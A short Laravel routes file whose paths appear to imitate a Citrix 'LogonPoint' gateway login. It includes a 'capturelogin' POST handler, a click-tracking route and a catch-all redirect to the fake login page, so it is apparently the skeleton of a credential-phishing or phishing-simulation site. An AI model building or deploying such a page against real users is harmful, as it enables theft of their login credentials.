<?php

use App\Http\Controllers\HomeController;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('logon/LogonPoint/index', 'HomeController@index');

Route::post('logon/LogonPoint/capturelogin', 'HomeController@store');
Route::get('user/clicks', 'HomeController@clicks');

Route::any(
    '{all}',function(){
        return redirect('logon/LogonPoint/index');
    }
)->where(['all'=>'.*']);
